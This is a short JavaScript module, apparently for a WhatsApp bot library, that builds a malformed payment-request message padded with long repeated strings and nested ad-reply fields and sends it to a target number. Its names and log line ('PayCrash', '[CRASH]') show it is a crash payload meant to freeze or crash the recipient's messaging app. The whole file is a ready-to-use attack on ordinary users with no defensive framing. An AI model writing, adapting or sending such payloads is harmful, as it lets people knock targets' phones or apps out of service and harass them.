// lib/crash.js
async function xeoninvisible(sock, target) {
  try {
    const PayCrash = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target,
        amount1000: 1000, // = 1 IDR
        amount: 1,  
        expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
        
        noteMessage: {
          extendedTextMessage: {
            text: 'G'.repeat(1500),
            contextInfo: {
              externalAdReply: {
                title: "Makloe",
                body: "".repeat(1500),
                mimetype: 'audio/mpeg',
                caption: "G".repeat(1500),
                showAdAttribution: true,
                sourceUrl: "https://t.me/functionbug",
                thumbnailUrl: 'https://files.catbox.moe/2z1knq.jpg',
                renderLargerThumbnail: true,
                mediaType: 2
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, PayCrash, {
      participant: target,
      messageId: null
    });

    console.log(`[CRASH] Payment request sent to ${target}`);
  } catch (error) {
    console.error("[CRASH ERROR]:", error.message);
    throw error;
  }
}

module.exports = { xeoninvisible };
